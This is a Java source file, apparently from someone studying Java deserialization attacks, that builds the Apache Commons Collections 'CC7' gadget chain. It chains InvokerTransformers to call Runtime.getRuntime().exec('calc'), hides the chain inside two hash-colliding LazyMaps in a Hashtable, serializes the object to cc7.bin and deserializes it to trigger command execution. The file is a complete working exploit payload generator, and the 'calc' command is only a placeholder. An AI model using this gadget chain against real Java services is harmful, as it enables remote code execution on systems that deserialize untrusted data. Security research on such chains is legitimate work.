package cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class CC7 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        lazyMap2.remove("yy");
        SerializableTest.searilze(hashtable,"cc7.bin");
        ConcurrentHashMap<String, String> deserialized = (ConcurrentHashMap<String, String>) SerializableTest.unzearilze("cc7.bin");

        // 检查 entrySet
        System.out.println("Entry Set: " + deserialized.entrySet());

        // 检查 size
        System.out.println("Size: " + deserialized.size());

        // 调用 equals 方法
        boolean isEqual = deserialized.equals(hashtable);
        System.out.println("Equal: " + isEqual);
    }
}
